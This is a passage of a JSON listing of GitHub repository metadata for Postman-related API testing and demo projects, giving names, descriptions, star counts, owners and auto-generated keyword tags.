    "created_at": "2019-12-22T22:12:38Z",
    "updated_at": "2020-02-10T19:54:09Z",
    "stargazers_count": 3,
    "watchers_count": 3,
    "forks": 1,
    "watchers": 3,
    "score": 1,
    "owner_id": 20980671,
    "owner_login": "VonHeikemen",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/20980671?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "client",
      "http",
      "line",
      "curl",
      "nobody"
    ]
  },
  {
    "id": 128671814,
    "name": "postman-slide-deck",
    "full_name": "pixelwhip/postman-slide-deck",
    "description": "Slides from Building Confidence in APIs with Postman: http://drupalcon2018-postman.surge.sh/",
    "fork": false,
    "created_at": "2018-04-08T18:51:18Z",
    "updated_at": "2018-04-10T19:04:21Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 967665,
    "owner_login": "pixelwhip",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/967665?v=4",
    "pulled": 1,
    "tags": [
      "http"
    ]
  },
  {
    "id": 54559677,
    "name": "MongoandPostmanRetry",
    "full_name": "timotayj/MongoandPostmanRetry",
    "description": null,
    "fork": false,
    "created_at": "2016-03-23T12:54:46Z",
    "updated_at": "2016-03-23T12:55:37Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 1347250,
    "owner_login": "timotayj",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/1347250?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 87590979,
    "name": "postman-bdd-common",
    "full_name": "AtScaleInc/postman-bdd-common",
    "description": null,
    "fork": false,
    "created_at": "2017-04-07T22:16:12Z",
    "updated_at": "2017-04-07T22:23:56Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 5431238,
    "owner_login": "AtScaleInc",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/5431238?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 110683572,
    "name": "postman-mock-server",
    "full_name": "josephfinlayson/postman-mock-server",
    "description": null,
    "fork": false,
    "created_at": "2017-11-14T11:48:45Z",
    "updated_at": "2017-11-28T07:47:13Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 1572410,
    "owner_login": "josephfinlayson",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/1572410?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 67880227,
    "name": "Postman-RandMaster",
    "full_name": "raphaelsoul/Postman-RandMaster",
    "description": null,
    "fork": false,
    "created_at": "2016-09-10T15:56:04Z",
    "updated_at": "2016-09-10T16:56:42Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 8615787,
    "owner_login": "raphaelsoul",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/8615787?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 56955688,
    "name": "soapui2postman",
    "full_name": "ubaid-me/soapui2postman",
    "description": "Converts SoapUI (https://www.soapui.org/) XML export to Postman (https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop?utm_source=chrome-ntp-icon) compatible json format.",
    "fork": false,
    "created_at": "2016-04-24T05:28:16Z",
    "updated_at": "2019-04-05T18:09:21Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 16315722,
    "owner_login": "ubaid-me",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/16315722?v=4",
    "pulled": 1,
    "tags": [
      "form",
      "json",
      "http",
      "format",
      "https",
      "export",
      "source",
      "store",
      "chrome",
      "google",
      "soapui",
      "soap"
    ]
  },
  {
    "id": 153126631,
    "name": "postman-talk_server",
    "full_name": "tech-talks-cj13/postman-talk_server",
    "description": null,
    "fork": false,
    "created_at": "2018-10-15T14:20:30Z",
    "updated_at": "2018-10-15T22:27:48Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 44168911,
    "owner_login": "tech-talks-cj13",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/44168911?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 34344677,
    "name": "postman-node-shopping-list",
    "full_name": "wwbbrr/postman-node-shopping-list",
    "description": "playing around with http.createServer and REST",
    "fork": false,
    "created_at": "2015-04-21T18:25:58Z",
    "updated_at": "2015-04-23T07:59:00Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 4615216,
    "owner_login": "wwbbrr",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/4615216?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "http",
      "play",
      "around",
      "playing"
    ]
  },
  {
    "id": 59006862,
    "name": "CityIndex.TradingAPI.Postman",
    "full_name": "AnCh7/CityIndex.TradingAPI.Postman",
    "description": "Postman Collection for Trading Api by CityIndex - http://docs.labs.cityindex.com",
    "fork": false,
    "created_at": "2016-05-17T09:01:20Z",
    "updated_at": "2016-05-17T10:54:49Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 2846093,
    "owner_login": "AnCh7",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/2846093?v=4",
    "pulled": 1,
    "tags": [
      "http",
      "docs",
      "city"
    ]
  },
  {
    "id": 119261980,
    "name": "postmanAPITesting",
    "full_name": "nicolashenschel/postmanAPITesting",
    "description": "Playing with Postman (https://www.getpostman.com/) and newman (https://www.npmjs.com/package/newman)",
    "fork": false,
    "created_at": "2018-01-28T13:44:36Z",
    "updated_at": "2018-01-28T13:44:36Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 1732412,
    "owner_login": "nicolashenschel",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/1732412?v=4",
    "pulled": 1,
    "tags": [
      "http",
      "newman",
      "https",
      "package",
      "getpost"
    ]
  },
  {
    "id": 166862188,
    "name": "PostmanApi",
    "full_name": "ngcamango/PostmanApi",
    "description": null,
    "fork": false,
    "created_at": "2019-01-21T18:40:13Z",
    "updated_at": "2019-01-21T19:32:43Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 6638216,
    "owner_login": "ngcamango",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/6638216?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 231652278,
    "name": "postmanAPi",
    "full_name": "gsezis/postmanAPi",
    "description": null,
    "fork": false,
    "created_at": "2020-01-03T19:32:23Z",
    "updated_at": "2020-01-03T22:46:16Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 20908142,
    "owner_login": "gsezis",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/20908142?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 182991485,
    "name": "PostmanAPI",
    "full_name": "NiveditaSachan/PostmanAPI",
    "description": null,
    "fork": false,
    "created_at": "2019-04-23T10:28:23Z",
    "updated_at": "2019-10-18T09:16:21Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 28826914,
    "owner_login": "NiveditaSachan",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/28826914?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 193398169,
    "name": "PostmanAPIProject",
    "full_name": "deledpe/PostmanAPIProject",
    "description": null,
    "fork": false,
    "created_at": "2019-06-23T21:42:59Z",
    "updated_at": "2019-06-29T23:03:16Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 23053226,
    "owner_login": "deledpe",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/23053226?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 34539538,
    "name": "postmanAPI",
    "full_name": "congodabongo/postmanAPI",
    "description": null,
    "fork": false,
    "created_at": "2015-04-24T20:13:31Z",
    "updated_at": "2018-11-25T20:09:02Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 12104691,
    "owner_login": "congodabongo",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/12104691?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 140829841,
    "name": "postmanToApiHtml",
    "full_name": "Raremaa/postmanToApiHtml",
    "description": "‰∏Ä‰∏™Âü∫‰∫épostmanÁöÑjavaÂ∞èÂ∑•ÂÖ∑ÔºåÁî®‰∫éÂ∞ÜpostmanÂØºÂá∫ÁöÑv1ÊñáÊ°£ËΩ¨Êç¢‰∏∫htmlÊñáÊ°£ÔºàÊú¨‰∫∫‰ªÖË¥üË¥£Êï¥Âêà,ÂéüÂàõËÄÖÂú∞ÂùÄ:https://www.cnblogs.com/XiOrang/p/5652875.html,https://www.cnblogs.com/xsnd/p/8708817.htmlÔºâ",
    "fork": false,
    "created_at": "2018-07-13T09:53:08Z",
    "updated_at": "2018-07-13T09:55:00Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 37170921,
    "owner_login": "Raremaa",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/37170921?v=4",
    "pulled": 1,
    "tags": [
      "http",
      "https",
      "java",
      "html",
      "blog",
      "logs",
      "blogs"
    ]
  },
  {
    "id": 175469920,
    "name": "PostmanCollectionForTeslaApis",
    "full_name": "droidment/PostmanCollectionForTeslaApis",
    "description": "Postman collection for Tesla APIs - Thanks https://www.teslaapi.io/",
    "fork": false,
    "created_at": "2019-03-13T17:39:29Z",
    "updated_at": "2019-03-13T17:52:26Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 1833503,
    "owner_login": "droidment",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/1833503?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "http",
      "https",
      "tesla"
    ]
  },
  {
    "id": 207537810,
    "name": "APIChainingInPostman",
    "full_name": "raghwendra-sonu/APIChainingInPostman",
    "description": "https://medium.com/@Raghwendra.sonu/postman-chain-api-requests-get-data-from-response-of-one-api-and-refer-in-another-api-d3bb184c2dd1",
    "fork": false,
    "created_at": "2019-09-10T11:11:50Z",
    "updated_at": "2019-11-14T03:44:37Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 7844894,
    "owner_login": "raghwendra-sonu",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/7844894?v=4",
    "pulled": 1,
    "tags": [
      "data",
      "request",
      "requests",
      "http",
      "https",
      "response",
      "chai",
      "another"
    ]
  },
  {
    "id": 207528819,
    "name": "APIDataDriverTestingWithPostman",
    "full_name": "raghwendra-sonu/APIDataDriverTestingWithPostman",
    "description": "https://medium.com/@Raghwendra.sonu/data-driven-testing-with-postman-using-csv-and-json-files-c4f112015eb3?source=friends_link&sk=d0e70700ef7d717ecb4c86dded9552ef",
    "fork": false,
    "created_at": "2019-09-10T10:21:39Z",
    "updated_at": "2019-11-14T03:48:14Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 7844894,
    "owner_login": "raghwendra-sonu",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/7844894?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "data",
      "testing",
      "file",
      "json",
      "http",
      "files",
      "https",
      "source",
      "link",
      "drive",
      "driven",
      "friend"
    ]
  },
  {
    "id": 220044376,
    "name": "postmanAutomationAnimalFacts",
    "full_name": "Ghop11/postmanAutomationAnimalFacts",
    "description": "API automation for animal facts. https://alexwohlbruck.github.io/cat-facts/docs/endpoints/facts.html",
    "fork": false,
    "created_at": "2019-11-06T16:43:13Z",
    "updated_at": "2019-11-06T16:51:17Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 17090675,
    "owner_login": "Ghop11",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/17090675?v=4",
    "pulled": 1,
    "tags": [
      "http",
      "auto",
      "automat",
      "endpoint",
      "points",
      "https",
      "endpoints",
      "automation",
      "html",
      "github",
      "docs",
      "facts",
      "animal"
    ]
  },
  {
    "id": 187700483,
    "name": "Postman-API_Tests",
    "full_name": "snangia/Postman-API_Tests",
    "description": "http://ab-branch.staging.acml.com/sites/api_service/Fund/GetFeeAndExpenses?countryCode=US&fundIsinOrLocalId=01878H778:3119",
    "fork": false,
    "created_at": "2019-05-20T19:23:13Z",
    "updated_at": "2019-05-20T20:07:05Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 30027127,
    "owner_login": "snangia",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/30027127?v=4",
    "pulled": 1,
    "tags": [
      "service",
      "http",
      "site"
    ]
  },
  {
    "id": 164330519,
    "name": "Postman-API-tests",
    "full_name": "Nachosky/Postman-API-tests",
    "description": null,
    "fork": false,
    "created_at": "2019-01-06T17:40:17Z",
    "updated_at": "2019-01-06T17:44:13Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 46422228,
    "owner_login": "Nachosky",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/46422228?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 191187335,
    "name": "postman_mercado",
    "full_name": "AJK55/postman_mercado",
    "description": "https://mercadobitcoin.net/api-doc/",
    "fork": false,
    "created_at": "2019-06-10T14:48:00Z",
    "updated_at": "2019-11-18T15:22:29Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 40635902,
    "owner_login": "AJK55",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/40635902?v=4",
    "pulled": 1,
    "tags": [
      "http",
      "https",
      "bitcoin"
    ]
  },
  {
    "id": 125916744,
    "name": "API-GITLAB-POSTMAN",
    "full_name": "gtardivo/API-GITLAB-POSTMAN",
    "description": "Usando API ‚Äì GitLab ‚Äì com o Postman (fonte:https://docs.gitlab.com/ee/api/README.html):",
    "fork": false,
    "created_at": "2018-03-19T20:33:05Z",
    "updated_at": "2018-03-19T21:15:53Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 32904269,
    "owner_login": "gtardivo",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/32904269?v=4",
    "pulled": 1,
    "tags": [
      "http",
      "https",
      "html",
      "docs",
      "gitlab"
    ]
  },
  {
    "id": 145791250,
    "name": "Postman_CRUD_API",
    "full_name": "aysel92/Postman_CRUD_API",
    "description": null,
    "fork": false,
    "created_at": "2018-08-23T02:48:28Z",
    "updated_at": "2018-08-23T02:57:26Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 38188150,
    "owner_login": "aysel92",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/38188150?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 196607386,
    "name": "REST_API_Testing_POSTMAN",
    "full_name": "qaespence/REST_API_Testing_POSTMAN",
    "description": "REST API testing using Postman for the site https://gorest.co.in",
    "fork": false,
    "created_at": "2019-07-12T15:58:08Z",
    "updated_at": "2019-08-10T03:28:34Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 43244945,
    "owner_login": "qaespence",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/43244945?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "rest",
      "http",
      "https",
      "site"
    ]
  },
  {
    "id": 189385758,
    "name": "tadayApiPostman",
    "full_name": "qaitive/tadayApiPostman",
    "description": null,
    "fork": false,
    "created_at": "2019-05-30T09:32:24Z",
    "updated_at": "2019-05-30T09:41:43Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 37244429,
    "owner_login": "qaitive",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/37244429?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 197182846,
    "name": "geogrid-apis-postman",
    "full_name": "retta-ti/geogrid-apis-postman",
    "description": "Projeto com as APIs do GeoGrid (https://geogridmaps.com.br/) para testar usando o Postman.",
    "fork": false,
    "created_at": "2019-07-16T11:41:22Z",
    "updated_at": "2019-09-01T16:37:27Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 48885066,
    "owner_login": "retta-ti",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/48885066?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "http",
      "https",
      "star",
      "usando",
      "maps",
      "geogrid"
    ]
  },
  {
    "id": 138647394,
    "name": "users_demo_api_postman_collection",
    "full_name": "kurtulussahin/users_demo_api_postman_collection",
    "description": "Postman-Travis integration demo - https://travis-ci.org/kurtulussahin/users_demo_api_postman_collection",
    "fork": false,
    "created_at": "2018-06-25T20:37:16Z",
    "updated_at": "2018-07-02T09:55:13Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 16954548,
    "owner_login": "kurtulussahin",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/16954548?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "http",
      "user",
      "https",
      "demo",
      "integration",
      "users",
      "travis"
    ]
  },
  {
    "id": 239089947,
    "name": "nodejs-ts-api",
    "full_name": "N0NU/nodejs-ts-api",
    "description": "postman collection link: https://www.getpostman.com/collections/415fe570cfb81c6393e8",
    "fork": false,
    "created_at": "2020-02-08T07:56:20Z",
    "updated_at": "2020-02-08T16:03:17Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 24547388,
    "owner_login": "N0NU",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/24547388?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "collections",
      "postman collection",
      "http",
      "https",
      "getpost",
      "link"
    ]
  },
  {
    "id": 39368894,
    "name": "denner-postman",
    "full_name": "ivan-wolf/denner-postman",
    "description": " Postman Collections for Denner 2.0 Portal and Web Services. https://www.getpostman.com",
    "fork": false,
    "created_at": "2015-07-20T07:12:48Z",
    "updated_at": "2016-05-24T12:15:19Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 7150803,
    "owner_login": "ivan-wolf",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/7150803?v=4",
    "pulled": 1,
    "tags": [
      "http",
      "https",
      "getpost"
    ]
  },
  {
    "id": 130590857,
    "name": "postman-to-http",
    "full_name": "vilimco/postman-to-http",
    "description": "Convert your Postman collection to PHPStorms' .http file collection. ",
    "fork": false,
    "created_at": "2018-04-22T17:29:59Z",
    "updated_at": "2018-05-21T14:58:55Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 8858431,
    "owner_login": "vilimco",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/8858431?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "file",
      "http"
    ]
  },
  {
    "id": 128932113,
    "name": "restaurant_reservation_api",
    "full_name": "dare-rider/restaurant_reservation_api",
    "description": "Postman Collection Link: https://www.getpostman.com/collections/c874107058b288d51bfc ",
    "fork": false,
    "created_at": "2018-04-10T12:51:49Z",
    "updated_at": "2018-07-13T13:27:48Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 7387651,
    "owner_login": "dare-rider",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/7387651?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "collections",
      "http",
      "https",
      "getpost",
      "4107"
    ]
  },
  {
    "id": 190613136,
    "name": "Module04",
    "full_name": "olenalo/Module04",
    "description": "Chess Game. Postman collection: https://www.getpostman.com/collections/a58c3174b389831b34a3",
    "fork": false,
    "created_at": "2019-06-06T16:20:48Z",
    "updated_at": "2019-07-15T18:50:26Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 23181360,
    "owner_login": "olenalo",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/23181360?v=4",
    "pulled": 1,
    "tags": [
      "collect",
      "collection",
      "collections",
      "http",
      "https",
      "getpost"
    ]
  },
  {
    "id": 248332083,
    "name": "Restful-Booker-API-tests",
    "full_name": "agafun/Restful-Booker-API-tests",
    "description": "API tests of https://restful-booker.herokuapp.com with Postman",
    "fork": false,
    "created_at": "2020-03-18T20:09:21Z",
    "updated_at": "2020-03-25T20:36:25Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 15617419,
    "owner_login": "agafun",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/15617419?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "tests",
      "rest",
      "tests ",
      "http",
      "https",
      "restful",
      "book",
      "heroku",
      "booker"
    ]
  },
  {
    "id": 237320048,
    "name": "resty",
    "full_name": "beekman/resty",
    "description": "RESTy is an API Server client appliction. It‚Äôs a lot like Postman or httpie, but it runs in the browser.",
    "fork": false,
    "created_at": "2020-01-30T22:40:59Z",
    "updated_at": "2020-01-30T23:04:07Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 563233,
    "owner_login": "beekman",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/563233?v=4",
    "pulled": 1,
    "tags": [
      "client",
      "http",
      "browser",
      "runs"
    ]
  },
  {
    "id": 117588375,
    "name": "RESTfulAPI_Ruby",
    "full_name": "samuelgedaly/RESTfulAPI_Ruby",
    "description": "Completed RESTful API using PostgreSQL database, you should be able to Create, Read, Uptade and Delete (CRUD) a Cause. I used Postman to send the different http requests with the following url: http://localhost:3000/api/v1/causes.",
    "fork": false,
    "created_at": "2018-01-15T19:47:05Z",
    "updated_at": "2018-01-19T17:58:30Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 27719250,
    "owner_login": "samuelgedaly",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/27719250?v=4",
    "pulled": 1,
    "tags": [
      "data",
      "request",
      "database",
      "requests",
      "http",
      "send",
      "local",
      "rent",
      "host",
      "uses",
      "following",
      "should",
      "cause"
    ]
  },
  {
    "id": 101423688,
    "name": "RESTful-In-Peace-Server",
    "full_name": "TahsinAnwarAkif/RESTful-In-Peace-Server",
    "description": "A Hospital Management  CRUD Project Developed with Spring Boot, MySQL, Maven, Postman & AngularJS (for front end in the same server). Client Code with Angular can be found in: https://github.com/TahsinAnwarAkif/RESTful-In-Peace-Client",
    "fork": false,
    "created_at": "2017-08-25T16:46:54Z",
    "updated_at": "2017-12-05T19:25:04Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 24354345,
    "owner_login": "TahsinAnwarAkif",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/24354345?v=4",
    "pulled": 1,
    "tags": [
      "server",
      "http",
      "https",
      "front",
      "github",
      "front end",
      "found"
    ]
  },
  {
    "id": 157522865,
    "name": "springboot-rest-image-retriever",
    "full_name": "xrayin/springboot-rest-image-retriever",
    "description": "A spring boot application that uses REST to retrieve an image. Images are currently saved in the directory resources/images for convenience. Best practice would be to save it to a file system. Call any of the endpoints with a program of your choice, I used Postman. e.g. GET -> http://localhost:8080/images/abcd.png",
    "fork": false,
    "created_at": "2018-11-14T09:20:05Z",
    "updated_at": "2018-11-16T07:31:37Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 10046966,
    "owner_login": "xrayin",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/10046966?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "application",
      "http",
      "endpoint",
      "points",
      "endpoints",
      "local",
      "source",
      "rent",
      "boot",
      "host",
      "spring",
      "image",
      "system",
      "program",
      "uses",
      "resource",
      "resources",
      "practice",
      "images",
      "spring boot",
      "retrieve",
      "current",
      "directory",
      "currently"
    ]
  },
  {
    "id": 206587682,
    "name": "PHP-Restful-Api-OOP-",
    "full_name": "Hossam-PHP/PHP-Restful-Api-OOP-",
    "description": "Project Run steps 1- You have sql file import it . (hossamapi.sql) 2- Put project folder in xampp/htdocs or any local server you want . 3- Go to postman and run this api urls :- 1. READ BOOKS ( Read All ): (Get) http://localhost/api/book/read.php2. CREATE BOOK : (POST) http://localhost/api/book/create.php Data to insert : { \"name\" : \"Amazing keivy 20.0\", \"isbn\" : \"4-7555-66777\", \"author\" : \"The best pillow for amazing readers.\", \"category_id\" : 2, \"publish_date\" : \"2018-06-01 00:35:07\" }3. UPDATE BOOK : (Post) http://localhost/api/book/update.php Data to update : { \"id\" : \"66\", \"name\" : \"Amazing keivy 20.0\", \"isbn\" : \"4-7555-66777\", \"author\" : \"The best pillow for amazing readers.\", \"category_id\" : 2, \"publish_date\" : \"2018-06-01 00:35:07\" }4. DELETE BOOK : (Delete) http://localhost/api/book/delete.php Data to delete : { \"id\" : \"66\" } ############################## 5. READ ONE BOOK : (Get) http://localhost/api/book/read_one.php?id=60 ############################## 6. SEARCH BOOKS : (Get) http://localhost/api/book/search.php?s=Amazing ############################## 7. PAGINATE BOOKS : (Get) http://localhost/api/book/read_paging.php ############################## 8. READ CATEGORIES : (Get) http://localhost/api/category/read.php",
    "fork": false,
    "created_at": "2019-09-05T14:45:35Z",
    "updated_at": "2019-09-09T13:45:23Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 54269560,
    "owner_login": "Hossam-PHP",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/54269560?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "create",
      "file",
      "server",
      "http",
      "auth",
      "local",
      "read",
      "import",
      "update",
      "host",
      "delete",
      "name",
      "search",
      "book",
      "docs",
      "folder",
      "best",
      "steps",
      "insert",
      "amazing",
      "urls"
    ]
  },
  {
    "id": 235235695,
    "name": "booking",
    "full_name": "tomashchuk/booking",
    "description": "REST API Booking Database with JWT authorization (using Bearer). Registration - https://bookingstest.herokuapp.com/auth/register/. Login - https://bookingstest.herokuapp.com/auth/login/ Root api: https://bookingstest.herokuapp.com/api/. Recommended to use Postman for testing purposes.",
    "fork": false,
    "created_at": "2020-01-21T01:58:08Z",
    "updated_at": "2020-01-21T03:03:14Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 58090105,
    "owner_login": "tomashchuk",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/58090105?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "http",
      "auth",
      "https",
      "book",
      "login",
      "purposes",
      "heroku",
      "register",
      "authorization",
      "booking"
    ]
  },
  {
    "id": 239401706,
    "name": "prueba_meta",
    "full_name": "neomarmedina/prueba_meta",
    "description": "Prueba de la empresa MetaData : Crear un proyecto p√∫blico en git (gitlab, github...) y compartirnos la url.  Crear un proyecto API/Rest en Laravel 6 con los sig requerimientos:  - PHP 7.3. - Base de datos Mysql 5 utf8mb4_unicode_ci llamada \"prueba_meta\".  Crear Servicio tipo POST que registre un modelo \"Author\" con el atributo \"name\"  Crear Servicio tipo POST que registre un modelo \"Book\" con los atributos \"publish_date\", \"title\", \"author_id\"  Crear un servicio tipo GET que retorne un listado de los \"Book\" y sus autores.  Crear las migraciones correspondientes para ambos modelos. (https://laravel.com/docs/6.x/migrations)  Los servicios deben devolver sus respuestas en formato JSON y tener validaciones para sus atributos usando \"Validator\" (https://laravel.com/docs/6.x/validation) e implementar \"Eloquent: API Resources\" (https://laravel.com/docs/6.x/eloquent-resources).  Los servicios ser√°n probados en Postman despu√©s de levantar el servidor (php artisan serve) y colocadas las variables de entorno en el archivo .env  ",
    "fork": false,
    "created_at": "2020-02-10T01:13:22Z",
    "updated_at": "2020-02-10T03:00:09Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 20566173,
    "owner_login": "neomarmedina",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/20566173?v=4",
    "pulled": 1,
    "tags": [
      "form",
      "http",
      "auto",
      "code",
      "implement",
      "format",
      "auth",
      "https",
      "list",
      "source",
      "name",
      "github",
      "resource",
      "model",
